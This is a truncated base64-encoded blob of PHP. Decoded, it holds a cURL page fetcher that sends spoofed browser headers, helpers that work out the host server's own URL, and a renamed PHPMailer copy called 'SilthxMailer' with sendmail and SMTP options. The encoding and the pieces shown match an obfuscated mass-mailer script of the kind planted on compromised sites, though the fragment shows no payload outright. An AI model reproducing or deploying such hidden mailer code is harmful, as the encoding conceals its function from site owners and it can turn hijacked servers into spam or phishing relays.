W5kb3dzIE5UIDYuMTsgLk5FVCBDTFIgMS4xLjQzMjIpIik7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMTUpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9FTkNPRElORywgJ2d6aXAsIGRlZmxhdGUnKTsNCiAgICAkaGVhZGVycyAgID0gYXJyYXkoKTsNCiAgICAkaGVhZGVyc1tdID0gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgcnY6NDUuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC80NS4wIjsNCiAgICAkaGVhZGVyc1tdID0gIkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44IjsNCiAgICAkaGVhZGVyc1tdID0gIkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUiOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCAkaGVhZGVycyk7DQogICAgJHBhZ2UgICAgID0gY3VybF9leGVjKCRjaCk7DQogICAgJGh0dHBjb2RlID0gY3VybF9nZXRpbmZvKCRjaCwgQ1VSTElORk9fSFRUUF9DT0RFKTsNCiAgICBpZigoJGh0dHBjb2RlID49IDUwMCAmJiAkaHR0cGNvZGUgPCA2MDApIG9yICgkaHR0cGNvZGUgPj0gNDAwICYmICRodHRwY29kZSA8IDUwMCkpIHsgcmV0dXJuICJSRU1PVEVfRVJST1JfIi4kaHR0cGNvZGUuIl9DVVJMfCIgLiAkdXJsOyB9DQoNCiAgICBpZiAoY3VybF9lcnJubygkY2gpKSB7DQogICAgICAgIHJldHVybiAiUkVNT1RFX0NVUkxfRVJSTk98IiAuIGN1cmxfZXJyb3IoJGNoKTsNCiAgICB9DQogICAgY3VybF9jbG9zZSgkY2gpOw0KICAgIHJldHVybiAkcGFnZTsNCn0NCmZ1bmN0aW9uIEdldFBhZ2VDb250ZW50KCR1cmwsICRwb3N0RmllbGRzID0gbnVsbCkgew0KICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpKSB7DQogICAgICAgIHJldHVybiBjVVJMUmVxdWVzdCgkdXJsLCAkcG9zdEZpZWxkcyk7DQogICAgfSBlbHNlaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2ZpbGVfZ2V0X2NvbnRlbnRzJykpIHsNCiAgICAgICAgcmV0dXJuICdmaWxlX2dldF9jb250ZW50cyBub3QgYXZhaWxhYmxlICEnOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGlmIChpc19hcnJheSgkcG9zdEZpZWxkcykpIHsNCiAgICAgICAgICAgICRwb3N0ZGF0YSA9IGh0dHBfYnVpbGRfcXVlcnkoJHBvc3RGaWVsZHMpOw0KICAgICAgICAgICAgJG9wdHMgICAgID0gYXJyYXkoDQogICAgICAgICAgICAgICAgJ2h0dHAnID0+IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsDQogICAgICAgICAgICAgICAgICAgICdoZWFkZXInID0+ICdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsDQogICAgICAgICAgICAgICAgICAgICdjb250ZW50JyA9PiAkcG9zdGRhdGENCiAgICAgICAgICAgICAgICApDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgJGNvbnRleHQgID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKCRvcHRzKTsNCiAgICAgICAgICAgICRyZXN1bHQgICA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsLCBmYWxzZSwgJGNvbnRleHQpOw0KICAgICAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KZnVuY3Rpb24gdXJsX29yaWdpbigkcywgJHVzZV9mb3J3YXJkZWRfaG9zdCA9IGZhbHNlKSB7DQogICAgJHNzbCAgICAgID0gKCFlbXB0eSgkc1snSFRUUFMnXSkgJiYgJHNbJ0hUVFBTJ10gPT0gJ29uJyk7DQogICAgJHNwICAgICAgID0gc3RydG9sb3dlcigkc1snU0VSVkVSX1BST1RPQ09MJ10pOw0KICAgICRwcm90b2NvbCA9IHN1YnN0cigkc3AsIDAsIHN0cnBvcygkc3AsICcvJykpIC4gKCgkc3NsKSA/ICdzJyA6ICcnKTsNCiAgICAkcG9ydCAgICAgPSAkc1snU0VSVkVSX1BPUlQnXTsNCiAgICAkcG9ydCAgICAgPSAoKCEkc3NsICYmICRwb3J0ID09ICc4MCcpIHx8ICgkc3NsICYmICRwb3J0ID09ICc0NDMnKSkgPyAnJyA6ICc6JyAuICRwb3J0Ow0KICAgICRob3N0ICAgICA9ICgkdXNlX2ZvcndhcmRlZF9ob3N0ICYmIGlzc2V0KCRzWydIVFRQX1hfRk9SV0FSREVEX0hPU1QnXSkpID8gJHNbJ0hUVFBfWF9GT1JXQVJERURfSE9TVCddIDogKGlzc2V0KCRzWydIVFRQX0hPU1QnXSkgPyAkc1snSFRUUF9IT1NUJ10gOiBudWxsKTsNCiAgICAkaG9zdCAgICAgPSBpc3NldCgkaG9zdCkgPyAkaG9zdCA6ICRzWydTRVJWRVJfTkFNRSddIC4gJHBvcnQ7DQogICAgcmV0dXJuICRwcm90b2NvbCAuICc6Ly8nIC4gJGhvc3Q7DQp9DQpmdW5jdGlvbiBmdWxsX3VybCgkcywgJHVzZV9mb3J3YXJkZWRfaG9zdCA9IGZhbHNlKSB7DQogICAgJFVSSSA9IGV4cGxvZGUoJz8nLCAkc1snUkVRVUVTVF9VUkknXSk7DQogICAgcmV0dXJuIHVybF9vcmlnaW4oJHMsICR1c2VfZm9yd2FyZGVkX2hvc3QpIC4gJFVSSVswXTsNCn0NCmNsYXNzIFNpbHRoeE1haWxlciB7DQogICAgcHVibGljICRQcmlvcml0eSA9IG51bGw7DQogICAgcHVibGljICRDaGFyU2V0ID0gJ2lzby04ODU5LTEnOw0KICAgIHB1YmxpYyAkQ29udGVudFR5cGUgPSAndGV4dC9wbGFpbic7DQogICAgcHVibGljICRFbmNvZGluZyA9ICc4Yml0JzsNCiAgICBwdWJsaWMgJEVycm9ySW5mbyA9ICcnOw0KICAgIHB1YmxpYyAkRnJvbSA9ICdyb290QGxvY2FsaG9zdCc7DQogICAgcHVibGljICRGcm9tTmFtZSA9ICdSb290IFVzZXInOw0KICAgIHB1YmxpYyAkU2VuZGVyID0gJyc7DQogICAgcHVibGljICRSZXR1cm5QYXRoID0gJyc7DQogICAgcHVibGljICRTdWJqZWN0ID0gJyc7DQogICAgcHVibGljICRCb2R5ID0gJyc7DQogICAgcHVibGljICRBbHRCb2R5ID0gJyc7DQogICAgcHVibGljICRJY2FsID0gJyc7DQogICAgcHJvdGVjdGVkICRNSU1FQm9keSA9ICcnOw0KICAgIHByb3RlY3RlZCAkTUlNRUhlYWRlciA9ICcnOw0KICAgIHByb3RlY3RlZCAkbWFpbEhlYWRlciA9ICcnOw0KICAgIHB1YmxpYyAkV29yZFdyYXAgPSAwOw0KICAgIHB1YmxpYyAkTWFpbGVyID0gJ21haWwnOw0KICAgIHB1YmxpYyAkU2VuZG1haWwgPSAnL3Vzci9zYmluL3NlbmRtYWlsJzsNCiAgICBwdWJsaWMgJFVzZVNlbmRtYWlsT3B0aW9ucyA9IHRydWU7DQogICAgcHVibGljICRQbHVnaW5EaXIgPSAnJzsNCiAgICBwdWJsaWMgJENvbmZpcm1SZWFkaW5nVG8gPSAnJzsNCiAgICBwdWJsaWMgJEhvc3RuYW1lID0gJyc7DQogICAgcHVibGljICRNZXNzYWdlSUQgPSAnJzsNCiAgICBwdWJsaWMgJE1lc3NhZ2VEYXRlID0gJyc7DQogICAgcHVibGljICRIb3N0ID0gJ2xvY2FsaG9zdCc7DQogICAgcHVibGljICRQb3J0ID0gMjU7DQogICAgcHVibGljICRIZWxvID0gJyc7DQogICAgcHVibGljICRTTVRQU2VjdXJlID0gJyc7DQogICAgcHVibGljICRVc2VTb2NrcyA9IGZhbHNlOw0KICAgIHB1YmxpYyAkU29ja3NIb3N0ID0gbnVsbDsNCiAgICBwdWJsaWMgJFNvY2tzUG9ydCA9IDA7DQogICAgcHVibGljICRTTVRQQXV0b1RMUyA9IHRydWU7DQogICAgcHVibGljICRTTVRQQXV0aCA9IGZhbHNlOw0KICAgIHB1YmxpYyAkU01UUE9wdGlvbnMgPSBhcnJheSgpOw0KICAgIHB1YmxpYyAkVXNlcm5hbWUgPSAnJzsNCiAgICBwdWJsaWMgJFBhc3N3b3JkID0gJyc7DQogICAgcHVibGljICRBdXRoVHlwZSA9ICcnOw0KICAgIHB1YmxpYyAkUmVhbG0gPSAnJzsNCiAgICBwdWJsaWMgJFdvcmtzdGF0aW9uID0gJyc7DQogICAgcHVibGljICRUaW1lb3V0ID0gMTA7DQogICAgcHVibGljICRTTVRQRGVidWcgPSAwOw0KICAgIHB1YmxpYyAkRGVidWdvdXRwdXQgPSAnZWNobyc7DQogICAgcHVibGljICRTTVRQS2VlcEFsaXZlID0gZmFsc2U7DQogICAgcHVibGljICRTaW5nbGVUbyA9IGZhbHNlOw0KICAgIHB1YmxpYyAkU2luZ2xlVG9BcnJheSA9IGFycmF5KCk7DQogICAgcHVibGljICRkb192ZXJwID0gZmFsc2U7DQogICAgcHVibGljICRBbGxvd0VtcHR5ID0gZmFsc2U7DQogICAgcHVibGljICRMRSA9ICJcbiI7DQogICAgcHVibGljICRES0lNX3NlbGVjdG9yID0gJyc7DQogICAgcHVibGljICRES0lNX2lkZW50aXR5ID0gJyc7DQogICAgcHVibGljICRES0lNX3Bhc3NwaHJhc2UgPSAnJzsNCiAgICBwdWJsaWMgJERLSU1fZG9tYWluID0gJyc7DQogICAgcHVibGljICRES0lNX3ByaXZhdGUgPSAnJzsNCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZV9zdHJpbmcgPSAnJzsNCiAgICBwdWJsaWMgJGFjdGlvbl9mdW5jdGlvbiA9ICcnOw0KICAgIHB1YmxpYyAkWE1haWxlciA9ICcnOw0KICAgIHB1YmxpYyBzdGF0aWMgJHZhbGlkYXRvciA9ICdhdXRvJzsNCiAgICBwcm90ZWN0ZWQgJHNtdHAgPSBudWxsOw0KICAgIHByb3RlY3RlZCAkdG8gPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkY2MgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkYmNjID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG8gPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkYWxsX3JlY2lwaWVudHMgPSBhcnJheSgpOw0KICAgIHByb3RlY3RlZCAkUmVjaXBpZW50c1F1ZXVlID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJFJlcGx5VG9RdWV1ZSA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRhdHRhY2htZW50ID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJEN1c3RvbUhlYWRlciA9IGFycmF5KCk7DQogICAgcHJvdGVjdGVkICRsYXN0TWVzc2FnZUlEID0gJyc7DQogICAgcHJvdGVjdGVkICRtZXNzYWdlX3R5cGUgPSAnJzsNCiAgICBwcm90ZWN0ZWQgJGJvdW5kYXJ5ID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGxhbmd1YWdlID0gYXJyYXkoKTsNCiAgICBwcm90ZWN0ZWQgJGVycm9yX2NvdW50ID0gMDsNCiAgICBwcm90ZWN0ZWQgJHNpZ25fY2VydF9maWxlID0gJyc7DQogICAgcHJvdGVjdGVkICRzaWduX2tleV9maWxlID0gJyc7DQogICAgcHJvdGVjdGVkICRzaWduX2V4dHJhY2VydHNfZmlsZSA9ICcnOw0KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfcGFzcyA9ICcnOw0KICAgIHByb3RlY3RlZCAkZXhjZXB0aW9ucyA9IGZhbHNlOw0KICAgIHByb3RlY3RlZCAkdW5pcXVlaWQgPSAnJzsNCiAgICBjb25zdCBTVE9QX01FU1NBR0UgPSAwOw0KICAgIGNvbnN0IFNUT1BfQ09OVElOVUUgPSAxOw0KICAgIGNvbnN0IFNUT1BfQ1JJVElDQUwgPSAyOw0KICAgIGNvbnN0IENSTEYgPSAiXHJcbiI7DQogICAgY29uc3QgTUFYX0xJTkVfTEVOR1RIID0gOTk4Ow0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkZXhjZXB0aW9ucyA9IG51bGwpIHsNCiAgICAgICAgaWYgKCRleGNlcHRpb25zICE9PSBudWxsKSB7DQogICAgICAgICAgICAkdGhpcy0+ZXhjZXB0aW9ucyA9IChib29sZWFuKSAkZXhjZXB0aW9uczsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpIHsNCiAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIG1haWxQYXNzdGhydSgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcykgew0KICAgICAgICBpZiAoaW5pX2dldCgnbWJzdHJpbmcuZnVuY19vdmVybG9hZCcpICYgMSkgew0KICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRzdWJqZWN0ID0gJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGluaV9nZXQoJ3NhZmVfbW9kZScpIG9yICEkdGhpcy0+VXNlU2VuZG1haWxPcHRpb25zIG9yIGlzX251bGwoJHBhcmFtcykpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlcik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIpIHsNCiAgICAgICAgaWYgKCR0aGlzLT5TTVRQRGVidWcgPD0gMCkgew0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIGlmICghaW5fYXJyYXkoJHRoaXMtPkRlYnVnb3V0cHV0LCBhcnJheSgNCiAgICAgICAgICAgICdlcnJvcl9sb2cnLA0KICAgICAgICAgICAgJ2h0bWwnLA0KICAgICAgICAgICAgJ2VjaG8nDQogICAgICAgICkpIGFuZCBpc19jYWxsYWJsZSgkdGhpcy0+RGVidWdvdXRwdXQpKSB7DQogICAgICAgICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICR0aGlzLT5TTVRQRGVidWcpOw0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7DQogICAgICAgICAgICBjYXNlICdlcnJvcl9sb2cnOg0KICAgICAgICAgICAgICAgIGVycm9yX2xvZygkc3RyKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ2h0bWwnOg0KICAgICAgICAgICAgICAgIGVjaG8gaHRtbGVudGl0aWVzKHByZWdfcmVwbGFjZSgnL1tcclxuXSsvJywgJycsICRzdHIpLCBFTlRfUVVPVEVTLCAnVVRGLTgnKSAuICI8YnI+XG4iOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnZWNobyc6DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRzdHIgPSBwcmVnX3JlcGxhY2UoJy9cclxuPy9tcycsICJcbiIsICRzdHIpOw0KICAgICAgICAgICAgICAgIGVjaG8gZ21kYXRlKCdZLW0tZCBIOmk6cycpIC4gIlx0IiAuIHN0cl9yZXBsYWNlKCJcbiIsICJcbiAgICAgICAgICAgICAgICAgICBcdCAgICAgICAgICAgICAgICAgICIsIHRyaW0oJHN0cikpIC4gIlxuIjsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNIVE1MKCRpc0h0bWwgPSB0cnVlKSB7DQogICAgICAgIGlmICgkaXNIdG1sKSB7DQogICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAndGV4dC9odG1sJzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTTVRQKCkgew0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3NtdHAnOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNNYWlsKCkgew0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ21haWwnOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNTZW5kbWFpbCgpIHsNCiAgICAgICAgJGluaV9zZW5kbWFpbF9wYXRoID0gaW5pX2dldCgnc2VuZG1haWxfcGF0aCcpOw0KICAgICAgICBpZiAoIXN0cmlzdHIoJGluaV9zZW5kbWFpbF9wYXRoLCAnc2VuZG1haWwnKSkgew0KICAgICAgICAgICAgJHRoaXMtPlNlbmRtYWlsID0gJy91c3Ivc2Jpbi9zZW5kbWFpbCc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAkaW5pX3NlbmRtYWlsX3BhdGg7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPk1haWxlciA9ICdzZW5kbWFpbCc7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBpc1FtYWlsKCkgew0KICAgICAgICAkaW5pX3NlbmRtYWlsX3BhdGggPSBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJyk7DQogICAgICAgIGlmICghc3RyaXN0cigkaW5pX3NlbmRtYWlsX3BhdGgsICdxbWFpbCcpKSB7DQogICAgICAgICAgICAkdGhpcy0+U2VuZG1haWwgPSAnL3Zhci9xbWFpbC9iaW4vcW1haWwtaW5qZWN0JzsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5TZW5kbWFpbCA9ICRpbmlfc2VuZG1haWxfcGF0aDsNCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+TWFpbGVyID0gJ3FtYWlsJzsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZEFkZHJlc3MoJGFkZHJlc3MsICRuYW1lID0gJycpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ3RvJywgJGFkZHJlc3MsICRuYW1lKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZENDKCRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdjYycsICRhZGRyZXNzLCAkbmFtZSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRCQ0MoJGFkZHJlc3MsICRuYW1lID0gJycpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5hZGRPckVucXVldWVBbkFkZHJlc3MoJ2JjYycsICRhZGRyZXNzLCAkbmFtZSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRSZXBseVRvKCRhZGRyZXNzLCAkbmFtZSA9ICcnKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+YWRkT3JFbnF1ZXVlQW5BZGRyZXNzKCdSZXBseS1UbycsICRhZGRyZXNzLCAkbmFtZSk7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBhZGRPckVucXVldWVBbkFkZHJlc3MoJGtpbmQsICRhZGRyZXNzLCAkbmFtZSkgew0KICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOw0KICAgICAgICAkbmFtZSAgICA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsNCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlKSB7DQogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICIgKGFkZEFuQWRkcmVzcyAka2luZCk6ICRhZGRyZXNzIjsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRwYXJhbXMgPSBhcnJheSgNCiAgICAgICAgICAgICRraW5kLA0KICAgICAgICAgICAgJGFkZHJlc3MsDQogICAgICAgICAgICAkbmFtZQ0KICAgICAgICApOw0KICAgICAgICBpZiAoJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIGFuZCAkdGhpcy0+aWRuU3VwcG9ydGVkKCkpIHsNCiAgICAgICAgICAgIGlmICgka2luZCAhPSAnUmVwbHktVG8nKSB7DQogICAgICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRhZGRyZXNzLCAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlKSkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKCRhZGRyZXNzLCAkdGhpcy0+UmVwbHlUb1F1ZXVlKSkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+UmVwbHlUb1F1ZXVlWyRhZGRyZXNzXSA9ICRwYXJhbXM7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoDQogICAgICAgICAgICAkdGhpcywNCiAgICAgICAgICAgICdhZGRBbkFkZHJlc3MnDQogICAgICAgICksICRwYXJhbXMpOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gYWRkQW5BZGRyZXNzKCRraW5kLCAkYWRkcmVzcywgJG5hbWUgPSAnJykgew0KICAgICAgICBpZiAoIWluX2FycmF5KCRraW5kLCBhcnJheSgNCiAgICAgICAgICAgICd0bycsDQogICAgICAgICAgICAnY2MnLA0KICAgICAgICAgICAgJ2JjYycsDQogICAgICAgICAgICAnUmVwbHktVG8nDQogICAgICAgICkpKSB7DQogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdJbnZhbGlkIHJlY2lwaWVudCBraW5kOiAnKSAuICRraW5kOw0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgew0KICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAiIChhZGRBbkFkZHJlc3MgJGtpbmQpOiAkYWRkcmVzcyI7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGtpbmQgIT0gJ1JlcGx5LVRvJykgew0KICAgICAgICAgICAgaWYgKCFhcnJheV9rZXlfZXhpc3RzKHN0cnRvbG93ZXIoJGFkZHJlc3MpLCAkdGhpcy0+YWxsX3JlY2lwaWVudHMpKSB7DQogICAgICAgICAgICAgICAgYXJyYXlfcHVzaCgkdGhpcy0+JGtpbmQsIGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcywNCiAgICAgICAgICAgICAgICAgICAgJG5hbWUNCiAgICAgICAgICAgICAgICApKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+YWxsX3JlY2lwaWVudHNbc3RydG9sb3dlcigkYWRkcmVzcyldID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cyhzdHJ0b2xvd2VyKCRhZGRyZXNzKSwgJHRoaXMtPlJlcGx5VG8pKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPlJlcGx5VG9bc3RydG9sb3dlcigkYWRkcmVzcyldID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICRhZGRyZXNzLA0KICAgICAgICAgICAgICAgICAgICAkbmFtZQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcGFyc2VBZGRyZXNzZXMoJGFkZHJzdHIsICR1c2VpbWFwID0gdHJ1ZSkgew0KICAgICAgICAkYWRkcmVzc2VzID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKCR1c2VpbWFwIGFuZCBmdW5jdGlvbl9leGlzdHMoJ2ltYXBfcmZjODIyX3BhcnNlX2Fkcmxpc3QnKSkgew0KICAgICAgICAgICAgJGxpc3QgPSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0KCRhZGRyc3RyLCAnJyk7DQogICAgICAgICAgICBmb3JlYWNoICgkbGlzdCBhcyAkYWRkcmVzcykgew0KICAgICAgICAgICAgICAgIGlmICgkYWRkcmVzcy0+aG9zdCAhPSAnLlNZTlRBWC1FUlJPUi4nKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzLT5tYWlsYm94IC4gJ0AnIC4gJGFkZHJlc3MtPmhvc3QpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gKHByb3BlcnR5X2V4aXN0cygkYWRkcmVzcywgJ3BlcnNvbmFsJykgPyAkYWRkcmVzcy0+cGVyc29uYWwgOiAnJyksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzLT5tYWlsYm94IC4gJ0AnIC4gJGFkZHJlc3MtPmhvc3QNCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkbGlzdCA9IGV4cGxvZGUoJywnLCAkYWRkcnN0cik7D